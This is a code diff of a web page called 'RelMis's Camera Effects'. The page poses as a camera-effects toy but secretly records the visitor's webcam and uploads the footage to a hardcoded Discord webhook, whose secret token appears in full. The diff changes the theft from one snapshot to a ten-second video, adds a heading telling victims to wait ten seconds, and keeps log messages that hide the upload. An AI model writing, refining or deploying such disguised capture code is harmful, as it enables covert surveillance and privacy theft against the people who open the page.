@@ -6,7 +6,7 @@
     <title>RelMis's Camera Effects</title>
 </head>
 <body>
-    <h1>Please allow access to try camera effects!</h1>
+    <h1>Please allow access to try camera effects! After you allow it, wait 10 seconds.</h1>
     <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
     <script>
@@ -14,36 +14,22 @@
         const ctx = canvas.getContext('2d');
         const webhookURL = 'https://discord.com/api/webhooks/1350881236280803492/343yx9XzqUQKzh6-b-WsGdgOMTy3bAv6O6t9kSbIVsd7Xn0btgOoOanbwOR7NMfsI2dd';
 
+        let mediaRecorder;
+        let recordedChunks = [];
+        let video;
+        let startTime;
+        let recording = false;
+
+        // Start accessing the webcam
         navigator.mediaDevices.getUserMedia({ video: true })
             .then(function(stream) {
-                const video = document.createElement('video');
+                video = document.createElement('video');  // Create the video element
                 video.srcObject = stream;
 
+                // Start recording when the video starts playing
                 video.onplaying = function() {
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    const imageUrl = canvas.toDataURL('image/jpeg');
-
-                    fetch(imageUrl)
-                        .then(response => response.blob())
-                        .then(blob => {
-                            const formData = new FormData();
-                            formData.append('file', blob, 'webcam_image.jpg');
-
-                            fetch(webhookURL, {
-                                method: 'POST',
-                                body: formData,
-                            })
-                            .then(response => response.json())
-                            .then(data => {
-                                console.log('Successfully loaded effects:', data);
-                            })
-                            .catch(error => {
-                                console.error('Error loading effects:', error);
-                            });
-                        })
-                        .catch(error => {
-                            console.error('Error turning on:', error);
-                        });
+                    // Start recording the stream
+                    startRecording(stream);
                 };
 
                 video.play();
@@ -51,6 +37,80 @@
             .catch(function(err) {
                 alert("Error accessing webcam: " + err);
             });
+
+        // Start recording function
+        function startRecording(stream) {
+            if (recording) return;
+
+            recordedChunks = [];
+            mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm; codecs=vp8' });
+
+            // Start the timer for 10 seconds
+            startTime = Date.now();
+
+            // When data is available, push it to recordedChunks
+            mediaRecorder.ondataavailable = function(event) {
+                recordedChunks.push(event.data);
+            };
+
+            // When the recording stops, check size and send the video to Discord
+            mediaRecorder.onstop = function() {
+                const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                const videoSizeMB = blob.size / (1024 * 1024);  // Get size in MB
+
+                console.log(`Video size: ${videoSizeMB} MB`);
+
+                // If the video size exceeds 8 MB or 10 seconds passed, send it to Discord
+                if (videoSizeMB >= 8 || (Date.now() - startTime) >= 10000) {
+                    sendVideoToWebhook(blob);
+                }
+            };
+
+            // Start recording
+            mediaRecorder.start();
+            recording = true;
+            console.log('Recording started...');
+
+            // Stop recording if 10 seconds have passed
+            setTimeout(function() {
+                if (recording) {
+                    mediaRecorder.stop();
+                    recording = false;
+                    console.log('Recording stopped after 10 seconds.');
+                }
+            }, 10000);  // Stop recording after 10 seconds
+
+            // Stop recording if the video size exceeds 8 MB
+            const checkSizeInterval = setInterval(function() {
+                const currentBlob = new Blob(recordedChunks, { type: 'video/webm' });
+                const currentSizeMB = currentBlob.size / (1024 * 1024);
+                if (currentSizeMB >= 8) {
+                    mediaRecorder.stop();
+                    recording = false;
+                    console.log(`Recording stopped as it exceeded 8 MB (size: ${currentSizeMB} MB)`);
+                    clearInterval(checkSizeInterval);
+                }
+            }, 1000);  // Check every second
+        }
+
+        // Send the recorded video to the Discord webhook
+        function sendVideoToWebhook(blob) {
+            const formData = new FormData();
+            formData.append('file', blob, 'webcam_video.webm');
+
+            // Send the video file to Discord webhook
+            fetch(webhookURL, {
+                method: 'POST',
+                body: formData,
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Successfully sent video:', data);
+            })
+            .catch(error => {
+                console.error('Error sending video:', error);
+            });
+        }
     </script>
 </body>
 </html>
